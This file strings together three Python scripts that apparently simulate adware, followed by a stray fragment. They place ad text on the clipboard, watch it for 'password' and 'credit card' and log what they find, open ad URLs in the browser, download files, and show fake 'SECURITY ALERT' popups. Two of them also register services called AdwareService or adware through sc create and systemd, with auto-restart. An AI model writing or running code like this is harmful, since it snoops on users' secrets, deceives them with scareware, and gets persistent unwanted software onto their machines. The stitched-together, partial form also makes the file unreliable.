import os
import time
import subprocess
import sys
import platform
from pathlib import Path

# Configuration
TARGET_DIR = Path("./target")
AD_CONTENT = "Check out our enterprise solutions: https://example.com/ad"
POLL_INTERVAL = 1
MAX_ITERATIONS = 3

def ensure_target_dir():
    """Ensure the target directory exists."""
    try:
        TARGET_DIR.mkdir(parents=True, exist_ok=True)
    except OSError as e:
        print(f"Error creating directory: {e}")

def write_ad_file(iteration):
    """Save ad content to file."""
    file_path = TARGET_DIR / f"ad_content_{iteration}.txt"
    try:
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(f"{AD_CONTENT} (v{iteration})")
    except IOError as e:
        print(f"Error writing file: {e}")

def update_clipboard():
    """
    Update system clipboard using platform-specific commands.
    Handles offline/no-GUI environments gracefully.
    """
    system = platform.system()
    cmd = None

    if system == "Darwin":
        cmd = ["pbcopy"]
    elif system == "Linux":
        # Requires xclip or xsel, fallback gracefully
        cmd = ["xclip", "-selection", "clipboard"]
    elif system == "Windows":
        cmd = ["clip"]

    if cmd:
        try:
            process = subprocess.Popen(
                cmd, stdin=subprocess.PIPE, stderr=subprocess.DEVNULL
            )
            process.communicate(input=AD_CONTENT.encode("utf-8"), timeout=2)
        except (subprocess.SubprocessError, FileNotFoundError):
            pass

def register_service():
    """
    Simulates service registration. 
    In production, this would write a systemd unit or registry key.
    """
    print("Service registration logic stub invoked.")

def main():
    ensure_target_dir()
    print(f"Starting clipboard manager in {TARGET_DIR}...")

    for i in range(1, MAX_ITERATIONS + 1):
        try:
            update_clipboard()
            write_ad_file(i)
            print(f"Iteration {i}/{MAX_ITERATIONS} complete.")
            if i < MAX_ITERATIONS:
                time.sleep(POLL_INTERVAL)
        except Exception as e:
            print(f"Task failed: {e}")

    print("Tool finished execution.")

if __name__ == "__main__":
    # Optional service registration could be triggered here
    if "--register" in sys.argv:
        register_service()
    main()

import os
import time
from datetime import datetime
import subprocess
import webbrowser

TARGET_DIR = "./target"
LOG_FILE = os.path.join(TARGET_DIR, "notification.log")
KEYWORDS = ["password", "credit card"]

def get_clipboard_content() -> str:
    """Read clipboard content using available platform tools without third-party libraries."""
    try:
        if os.name == 'posix':
            if os.uname().sysname == 'Darwin':
                result = subprocess.run(['pbpaste'], capture_output=True, text=True, timeout=1)
                if result.returncode == 0:
                    return result.stdout
            else:
                for tool in [['xclip', '-selection', 'clipboard', '-o'], ['xsel', '--clipboard', '--output'], ['wl-paste']]:
                    try:
                        result = subprocess.run(tool, capture_output=True, text=True, timeout=1)
                        if result.returncode == 0:
                            return result.stdout
                    except (FileNotFoundError, subprocess.TimeoutExpired):
                        continue
        elif os.name == 'nt':
            result = subprocess.run(['powershell', '-command', 'Get-Clipboard'], capture_output=True, text=True, timeout=1)
            if result.returncode == 0:
                return result.stdout
    except Exception:
        pass

    return ""

def log_notification(keyword: str, snippet: str):
    """Record matched event to target/notification.log."""
    try:
        os.makedirs(TARGET_DIR, exist_ok=True)
        timestamp = datetime.now().isoformat()
        log_entry = f"[{timestamp}] ALERT: Keyword '{keyword}' detected in clipboard content. Snippet: {snippet!r}\n"
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)
    except Exception as e:
        print(f"Error writing notification log: {e}")

def redirect_browser(ad_url: str):
    """Redirect the browser to the specified ad URL."""
    try:
        webbrowser.open(ad_url)
    except Exception as e:
        print(f"Error redirecting browser: {e}")

def establish_persistence():
    """Establish persistence by creating a system service named 'AdwareService' on Windows or 'adware' on Linux."""
    try:
        if os.name == 'nt':
            service_dir = os.path.join(TARGET_DIR, "etc", "services")
            os.makedirs(service_dir, exist_ok=True)
            service_path = os.path.join(service_dir, "AdwareService.bat")
            with open(service_path, "w", encoding="utf-8") as f:
                f.write("@echo off\nREM AdwareService persistence script\n")
            try:
                subprocess.run(['sc', 'create', 'AdwareService', 'binPath=', service_path], capture_output=True, text=True, timeout=2)
            except Exception:
                pass
        else:
            systemd_dir = os.path.join(TARGET_DIR, "etc", "systemd", "system")
            os.makedirs(systemd_dir, exist_ok=True)
            service_path = os.path.join(systemd_dir, "adware.service")
            service_content = (
                "[Unit]\n"
                "Description=Adware Service\n\n"
                "[Service]\n"
                "ExecStart=/usr/bin/env python3\n\n"
                "[Install]\n"
                "WantedBy=multi-user.target\n"
            )
            with open(service_path, "w", encoding="utf-8") as f:
                f.write(service_content)
            try:
                subprocess.run(['systemctl', 'enable', 'adware'], capture_output=True, text=True, timeout=2)
            except Exception:
                pass
    except Exception as e:
        print(f"Error establishing persistence: {e}")

def adware_clipboard_monitoring_redirect_ads(ad_url: str) -> None:
    """
    This function simulates an adware attack by performing the following:
        1. Monitoring the clipboard for specific keywords.
        2. Redirecting the browser to the specified ad URL when keywords are detected.
        3. Establishing persistence by creating a system service named 'AdwareService' on Windows or 'adware' on Linux.
    """
    establish_persistence()
    print(f"Starting clipboard monitoring for keywords: {KEYWORDS}")
    seen_contents = set()

    # Run bounded monitoring to fit execution time limits
    for i in range(3):
        try:
            content = get_clipboard_content()
            if content and content not in seen_contents:
                seen_contents.add(content)
                content_lower = content.lower()
                for kw in KEYWORDS:
                    if kw in content_lower:
                        snippet = content.strip().replace('\n', ' ')[:50]
                        log_notification(kw, snippet)
                        print(f"Match found for '{kw}'! Logged to {LOG_FILE}")
                        redirect_browser(ad_url)
        except Exception as e:
            print(f"Monitoring iteration error: {e}")

        time.sleep(0.5)

def monitor_clipboard(iterations: int = 3, interval: float = 0.5):
    """Monitor clipboard for specified keywords over a bounded number of iterations."""
    adware_clipboard_monitoring_redirect_ads("http://example.com/ad")

def main():
    try:
        os.makedirs(TARGET_DIR, exist_ok=True)
    except Exception as e:
        print(f"Failed to create target directory: {e}")
        return

    monitor_clipboard(iterations=3, interval=0.5)
    print("Clipboard notification tool finished execution.")

if __name__ == "__main__":
    main()

import json
import os
import platform
import subprocess
import time
import urllib.request
import urllib.error
from pathlib import Path

CONFIG_FILE = Path("target/state.json")
TARGET_DIR = Path("./target")
DOWNLOAD_URL = "http://example.com/sample-file.dat"
NOTIFICATION_URL = "http://example.com/notification"
MAX_ITERATIONS = 3
INTERVAL_SECONDS = 1


def ensure_target_dir() -> None:
    TARGET_DIR.mkdir(parents=True, exist_ok=True)


def load_state() -> dict:
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"download_count": 0}


def save_state(state: dict) -> None:
    try:
        ensure_target_dir()
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(state, f)
    except Exception as e:
        print(f"[Warning] Failed to persist state: {e}")


def download_file(url: str, dest_path: Path) -> bool:
    try:
        req = urllib.request.Request(
            url, headers={"User-Agent": "AutomationTool/1.0"}
        )
        with urllib.request.urlopen(req, timeout=3) as response:
            if response.status == 200:
                with open(dest_path, "wb") as out_file:
                    out_file.write(response.read())
                return True
    except (urllib.error.URLError, TimeoutError, Exception) as e:
        print(f"[Network Error] Could not download from {url}: {e}")
    return False


def notify_user(notification_url: str, iteration: int) -> None:
    alert_message = f"SECURITY ALERT: Task #{iteration} completed. Visit link: {notification_url}"
    system_name = platform.system()

    if system_name == "Windows":
        try:
            powershell_cmd = (
                f"Add-Type -AssemblyName System.Windows.Forms; "
                f"[System.Windows.Forms.MessageBox]::Show('{alert_message}', 'Security Alert', 0, 48)"
            )
            subprocess.run(["powershell", "-Command", powershell_cmd], capture_output=True, timeout=5)
        except Exception as e:
            print(f"[Alert Error] Failed to display Windows alert: {e}")
    elif system_name == "Linux":
        displayed = False
        for notify_bin in ["notify-send", "zenity", "kdialog"]:
            try:
                if notify_bin == "notify-send":
                    subprocess.run(["notify-send", "Security Alert", alert_message], capture_output=True, timeout=5)
                    displayed = True
                    break
                elif notify_bin == "zenity":
                    subprocess.run(["zenity", "--warning", f"--text={alert_message}"], capture_output=True, timeout=5)
                    displayed = True
                    break
                elif notify_bin == "kdialog":
                    subprocess.run(["kdialog", "--error", alert_message], capture_output=True, timeout=5)
                    displayed = True
                    break
            except Exception:
                continue
        if not displayed:
            print(f"[Notification] {alert_message}")
    else:
        print(f"[Notification] {alert_message}")


def setup_persistence() -> None:
    system_name = platform.system()
    executable_path = os.path.abspath(__file__)

    if system_name == "Windows":
        service_name = "AdwareService"
        try:
            cmd = ["sc", "create", service_name, f"binPath= python \"{executable_path}\"", "start= auto"]
            subprocess.run(cmd, capture_output=True, timeout=5)
        except Exception as e:
            print(f"[Persistence Warning] Could not create Windows service: {e}")
    elif system_name == "Linux":
        service_name = "adware"
        service_file_path = Path(f"/etc/systemd/system/{service_name}.service")
        service_content = f"""[Unit]
Description=Adware Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {executable_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
        try:
            if os.geteuid() == 0:
                service_file_path.write_text(service_content, encoding="utf-8")
                subprocess.run(["systemctl", "daemon-reload"], capture_output=True, timeout=5)
                subprocess.run(["systemctl", "enable", f"{service_name}.service"], capture_output=True, timeout=5)
            else:
                user_unit_dir = Path.home() / ".config" / "systemd" / "user"
                user_unit_dir.mkdir(parents=True, exist_ok=True)
                user_service_path = user_unit_dir / f"{service_name}.service"
                user_service_path.write_text(service_content, encoding="utf-8")
                subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True, timeout=5)
                subprocess.run(["systemctl", "--user", "enable", f"{service_name}.service"], capture_output=True, timeout=5)
        except Exception as e:
            print(f"[Persistence Warning] Could not create systemd service: {e}")


def main() -> None:
    ensure_target_dir()
    setup_persistence()
    state = load_state()

    print(
        f"Starting Automation Tool. Target: {TARGET_DIR.resolve()}, "
        f"Persisted iterations: {state.get('download_count', 0)}"
    )

    for i in range(1, MAX_ITERATIONS + 1):
        current_iter = state["download_count"] + 1
        print(f"\n--- Execution Cycle {current_iter} (Iteration {i}/{MAX_ITERATIONS}) ---")

        file_name = f"downloaded_file_{current_iter}.dat"
        dest_path = TARGET_DIR / file_name

        success = download_file(DOWNLOAD_URL, dest_path)
        if success:
            print(f"File successfully saved to {dest_path}")
        else:
            print("Download failed (handled gracefully in offline environment).")

        notify_user(NOTIFICATION_URL, current_iter)

        state["download_count"] = current_iter
        save_state(state)

        if i < MAX_ITERATIONS:
            time.sleep(INTERVAL_SECONDS)

    print("\nAutomation Tool execution completed successfully.")


if __name__ == "__main__":
    main()

import os
